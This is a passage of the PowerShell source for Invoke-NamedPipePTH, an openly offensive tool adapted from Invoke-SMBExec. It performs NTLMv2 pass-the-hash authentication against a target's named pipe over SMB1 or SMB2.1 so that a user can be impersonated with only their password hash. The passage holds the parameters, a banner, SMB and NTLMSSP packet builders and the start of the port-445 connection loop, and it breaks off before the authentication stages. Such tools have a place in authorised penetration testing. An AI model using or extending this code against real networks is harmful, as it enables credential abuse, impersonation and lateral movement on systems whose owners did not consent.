function Invoke-NamedPipePTH
{
<#
.SYNOPSIS
Invoke-NamedPipePTH is a big copy & paste project from Invoke-SMBExec (https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1) written by Kevin Robertson (@kevin_robertson) with slight modifications. It performs NTLMv2 pass the hash authentication to a named pipe. This can be used to for example impersonate a user on that Pipe when only the NTLM hash is known. Invoke-NamedPipePTH
supports SMB1 and SMB2.1 with and without SMB signing.

Author: Fabian Mosch (@shitsecure)
License: BSD 3-Clause

.PARAMETER Target
Hostname or IP address of target.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username.

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER PipeName
The named pipe to access.

.PARAMETER Version
Default = Auto: (Auto,1,2.1) Force SMB version. The default behavior is to perform SMB version negotiation and use SMB2.1 if supported by the
target.


#>
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$true)][String]$Target,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$PipeName,
    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash

)

if(!$Target)
{
    Write-Output "[-] Target is required when not using -Session"
    throw
}

    @'
             
         __   ___  __   __   __            ___  ___       __   ___  __      __  ___      
███╗   ██╗ █████╗ ███╗   ███╗███████╗██████╗ ██████╗ ██╗██████╗ ███████╗██████╗ ████████╗██╗  ██╗
████╗  ██║██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║
██╔██╗ ██║███████║██╔████╔██║█████╗  ██║  ██║██████╔╝██║██████╔╝█████╗  ██████╔╝   ██║   ███████║
██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══╝  ██║  ██║██╔═══╝ ██║██╔═══╝ ██╔══╝  ██╔═══╝    ██║   ██╔══██║
██║ ╚████║██║  ██║██║ ╚═╝ ██║███████╗██████╔╝██║     ██║██║     ███████╗██║        ██║   ██║  ██║
╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝        ╚═╝   ╚═╝  ╚═╝
                                                                                                  
                                                                                         
                                               by @shitsecure
'@

if($Version -eq '1')
{
    $SMB_version = 'SMB1'
}
elseif($Version -eq '2.1')
{
    $SMB_version = 'SMB2.1'
}

if($PsCmdlet.ParameterSetName -ne 'Auth' -and $PsCmdlet.ParameterSetName -ne 'Session')
{
    $signing_check = $true
}

function ConvertFrom-PacketOrderedDictionary
{
    param($OrderedDictionary)

    ForEach($field in $OrderedDictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function New-PacketNetBIOSSessionService
{
    param([Int]$HeaderLength,[Int]$DataLength)

    [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]

    $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))
    $NetBIOSSessionService.Add("Length",$length)

    return $NetBIOSSessionService
}

#SMB1

function New-PacketSMBHeader
{
    param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)

    $ProcessID = $ProcessID[0,1]

    $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $SMBHeader.Add("Command",$Command)
    $SMBHeader.Add("ErrorClass",[Byte[]](0x00))
    $SMBHeader.Add("Reserved",[Byte[]](0x00))
    $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Flags",$Flags)
    $SMBHeader.Add("Flags2",$Flags2)
    $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMBHeader.Add("TreeID",$TreeID)
    $SMBHeader.Add("ProcessID",$ProcessID)
    $SMBHeader.Add("UserID",$UserID)
    $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $SMBHeader
}
function New-PacketSMBNegotiateProtocolRequest
{
    param([String]$Version)

    if($Version -eq 'SMB1')
    {
        [Byte[]]$byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$byte_count = 0x22,0x00  
    }

    $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
    $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($version -ne 'SMB1')
    {
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $SMBNegotiateProtocolRequest
}

function New-PacketSMBSessionSetupAndXRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$byte_count = [System.BitConverter]::GetBytes($SecurityBlob.Length)[0,1]
    [Byte[]]$security_blob_length = [System.BitConverter]::GetBytes($SecurityBlob.Length + 5)[0,1]

    $SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBSessionSetupAndXRequest.Add("WordCount",[Byte[]](0x0c))
    $SMBSessionSetupAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBSessionSetupAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBSessionSetupAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("MaxBuffer",[Byte[]](0xff,0xff))
    $SMBSessionSetupAndXRequest.Add("MaxMpxCount",[Byte[]](0x02,0x00))
    $SMBSessionSetupAndXRequest.Add("VCNumber",[Byte[]](0x01,0x00))
    $SMBSessionSetupAndXRequest.Add("SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("SecurityBlobLength",$byte_count)
    $SMBSessionSetupAndXRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
    $SMBSessionSetupAndXRequest.Add("ByteCount",$security_blob_length)
    $SMBSessionSetupAndXRequest.Add("SecurityBlob",$SecurityBlob)
    $SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))

    return $SMBSessionSetupAndXRequest 
}

function New-PacketSMBTreeConnectAndXRequest
{
    param([Byte[]]$Path)

    [Byte[]]$path_length = $([System.BitConverter]::GetBytes($Path.Length + 7))[0,1]

    $SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBTreeConnectAndXRequest.Add("WordCount",[Byte[]](0x04))
    $SMBTreeConnectAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBTreeConnectAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBTreeConnectAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBTreeConnectAndXRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMBTreeConnectAndXRequest.Add("PasswordLength",[Byte[]](0x01,0x00))
    $SMBTreeConnectAndXRequest.Add("ByteCount",$path_length)
    $SMBTreeConnectAndXRequest.Add("Password",[Byte[]](0x00))
    $SMBTreeConnectAndXRequest.Add("Tree",$Path)
    $SMBTreeConnectAndXRequest.Add("Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

    return $SMBTreeConnectAndXRequest
}

function New-PacketSMBNTCreateAndXRequest
{
    param([Byte[]]$NamedPipe)

    [Byte[]]$named_pipe_length = $([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]
    [Byte[]]$file_name_length = $([System.BitConverter]::GetBytes($NamedPipe.Length - 1))[0,1]

    $SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNTCreateAndXRequest.Add("WordCount",[Byte[]](0x18))
    $SMBNTCreateAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBNTCreateAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Reserved2",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("FileNameLen",$file_name_length)
    $SMBNTCreateAndXRequest.Add("CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("RootFID",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SMBNTCreateAndXRequest.Add("AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Disposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("SecurityFlags",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("ByteCount",$named_pipe_length)
    $SMBNTCreateAndXRequest.Add("Filename",$NamedPipe)

    return $SMBNTCreateAndXRequest
}

function New-PacketSMBReadAndXRequest
{
    $SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBReadAndXRequest.Add("WordCount",[Byte[]](0x0a))
    $SMBReadAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBReadAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBReadAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBReadAndXRequest.Add("FID",[Byte[]](0x00,0x40))
    $SMBReadAndXRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBReadAndXRequest.Add("MaxCountLow",[Byte[]](0x58,0x02))
    $SMBReadAndXRequest.Add("MinCount",[Byte[]](0x58,0x02))
    $SMBReadAndXRequest.Add("Unknown",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBReadAndXRequest.Add("Remaining",[Byte[]](0x00,0x00))
    $SMBReadAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBReadAndXRequest
}

function New-PacketSMBWriteAndXRequest
{
    param([Byte[]]$FileID,[Int]$Length)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($Length)[0,1]

    $SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBWriteAndXRequest.Add("WordCount",[Byte[]](0x0e))
    $SMBWriteAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBWriteAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBWriteAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBWriteAndXRequest.Add("FID",$FileID)
    $SMBWriteAndXRequest.Add("Offset",[Byte[]](0xea,0x03,0x00,0x00))
    $SMBWriteAndXRequest.Add("Reserved2",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBWriteAndXRequest.Add("WriteMode",[Byte[]](0x08,0x00))
    $SMBWriteAndXRequest.Add("Remaining",$write_length)
    $SMBWriteAndXRequest.Add("DataLengthHigh",[Byte[]](0x00,0x00))
    $SMBWriteAndXRequest.Add("DataLengthLow",$write_length)
    $SMBWriteAndXRequest.Add("DataOffset",[Byte[]](0x3f,0x00))
    $SMBWriteAndXRequest.Add("HighOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBWriteAndXRequest.Add("ByteCount",$write_length)

    return $SMBWriteAndXRequest
}

function New-PacketSMBCloseRequest
{
    param ([Byte[]]$FileID)

    $SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBCloseRequest.Add("WordCount",[Byte[]](0x03))
    $SMBCloseRequest.Add("FID",$FileID)
    $SMBCloseRequest.Add("LastWrite",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBCloseRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBCloseRequest
}

function New-PacketSMBTreeDisconnectRequest
{
    $SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBTreeDisconnectRequest.Add("WordCount",[Byte[]](0x00))
    $SMBTreeDisconnectRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBTreeDisconnectRequest
}

function New-PacketSMBLogoffAndXRequest
{
    $SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBLogoffAndXRequest.Add("WordCount",[Byte[]](0x02))
    $SMBLogoffAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBLogoffAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBLogoffAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBLogoffAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBLogoffAndXRequest
}

#SMB2

function New-PacketSMB2Header
{
    param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)

    if($Signing)
    {
        $flags = 0x08,0x00,0x00,0x00      
    }
    else
    {
        $flags = 0x00,0x00,0x00,0x00
    }

    [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)

    if($message_ID.Length -eq 4)
    {
        $message_ID += 0x00,0x00,0x00,0x00
    }

    $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
    $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
    $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Command",$Command)
    $SMB2Header.Add("CreditRequest",$CreditRequest)
    $SMB2Header.Add("Flags",$flags)
    $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2Header.Add("MessageID",$message_ID)
    $SMB2Header.Add("ProcessID",$ProcessID)
    $SMB2Header.Add("TreeID",$TreeID)
    $SMB2Header.Add("SessionID",$SessionID)
    $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SMB2Header
}

function New-PacketSMB2NegotiateProtocolRequest
{
    $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
    $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
    $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
    $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $SMB2NegotiateProtocolRequest
}

function New-PacketSMB2SessionSetupRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]

    $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
    $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
    $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
    $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)
    $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)

    return $SMB2SessionSetupRequest 
}

function New-PacketSMB2TreeConnectRequest
{
    param([Byte[]]$Buffer)

    [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]

    $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
    $SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
    $SMB2TreeConnectRequest.Add("PathLength",$path_length)
    $SMB2TreeConnectRequest.Add("Buffer",$Buffer)

    return $SMB2TreeConnectRequest
}

function New-PacketSMB2CreateRequestFile
{
    param([Byte[]]$NamedPipe)

    $name_length = ([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]

    $SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CreateRequestFile.Add("StructureSize",[Byte[]](0x39,0x00))
    $SMB2CreateRequestFile.Add("Flags",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("RequestedOplockLevel",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("NameOffset",[Byte[]](0x78,0x00))
    $SMB2CreateRequestFile.Add("NameLength",$name_length)
    $SMB2CreateRequestFile.Add("CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Buffer",$NamedPipe)

    return $SMB2CreateRequestFile
}

function New-PacketSMB2ReadRequest
{
    param ([Byte[]]$FileID)

    $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
    $SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
    $SMB2ReadRequest.Add("Length",[Byte[]](0x00,0x00,0x10,0x00))
    $SMB2ReadRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("FileID",$FileID)
    $SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $SMB2ReadRequest
}

function New-PacketSMB2WriteRequest
{
    param([Byte[]]$FileID,[Int]$RPCLength)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($RPCLength)

    $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
    $SMB2WriteRequest.Add("Length",$write_length)
    $SMB2WriteRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("FileID",$FileID)
    $SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

    return $SMB2WriteRequest
}

function New-PacketSMB2CloseRequest
{
    param ([Byte[]]$FileID)

    $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
    $SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CloseRequest.Add("FileID",$FileID)

    return $SMB2CloseRequest
}

function New-PacketSMB2TreeDisconnectRequest
{
    $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2TreeDisconnectRequest
}

function New-PacketSMB2SessionLogoffRequest
{
    $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2SessionLogoffRequest
}

#NTLM

function New-PacketNTLMSSPNegotiate
{
    param([Byte[]]$NegotiateFlags,[Byte[]]$Version)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
    [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32
    [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22
    [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20
    [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2

    $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
    $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)
    $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)
    $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)
    $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
    $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
    $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
    $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
    $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)
    $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
    $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)
    $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($Version)
    {
        $NTLMSSPNegotiate.Add("Version",$Version)
    }

    return $NTLMSSPNegotiate
}

function New-PacketNTLMSSPAuth
{
    param([Byte[]]$NTLMResponse)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]
    [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]
    [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]
    [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]

    $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
    $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)
    $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
    $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)
    $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
    $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)
    $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
    $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)

    return $NTLMSSPAuth
}


function Get-StatusPending
{
    param ([Byte[]]$Status)

    if([System.BitConverter]::ToString($Status) -eq '03-01-00-00')
    {
        $status_pending = $true
    }

    return $status_pending
}

function Get-UInt16DataLength
{
    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
[Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

$client = New-Object System.Net.Sockets.TCPClient
$client.Client.ReceiveTimeout = 60000


if(!$startup_error)
{

    try
    {
        $client.Connect($Target,"445")
    }
    catch
    {
        Write-Output "[-] $Target did not respond"
    }

}

if($client.Connected -or (!$startup_error))
{
    Write-Verbose "Connection established"
    $client_receive = New-Object System.Byte[] 1024

        $client_stream = $client.GetStream()

        if($SMB_version -eq 'SMB2.1')
        {
            $stage = 'NegotiateSMB2'
        }
        else
        {
            $stage = 'NegotiateSMB'
        }

        while($stage -ne 'Exit')
        {

            try
            {

                switch ($stage)
                {

